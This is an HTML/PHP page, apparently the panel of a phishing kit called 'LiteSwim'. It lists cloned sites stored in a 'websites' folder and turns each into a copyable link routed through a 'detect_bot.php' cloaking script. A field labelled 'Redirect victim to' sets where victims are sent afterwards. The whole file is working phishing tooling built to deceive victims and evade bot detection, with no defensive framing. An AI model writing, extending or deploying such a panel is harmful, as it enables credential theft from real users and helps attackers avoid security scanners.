<script src="modules/script.js"></script>
<link rel="stylesheet" href="modules/style.css">
<center>	
<title>LiteSwim</title> 
<img src=logo.png style=max-width:100%;width:250px;height:300px;><br>
<!--
<a style="font-size:20px" href=>LiteSwim</a><br>
-->
<br>
<input oninput=UpdateRedirects(this.id) placeholder="Redirect victim to ? http://example.com" id="redirect">
<br><br><br>

<?php
$Current_Url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on" ? "https://" : "http://").$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']); //https://stackoverflow.com/a/64450973/11390822
$SiteIndex = 1;

foreach(scandir('./websites') as $file) 
{
	if (!is_dir('./websites/'.$file)) 
	{
		echo "<a target=_blank href='".$Current_Url."/modules/detect_bot.php?filename=$file'>".$SiteIndex.") ".$file."</a><br>";
		echo "<textarea onclick='Copy(this.id);' id='textarea_$file'>".$Current_Url."/modules/detect_bot.php?filename=".$file."</textarea>";
		echo "<br><br><br>";
		$SiteIndex += 1;
	}
}
?>
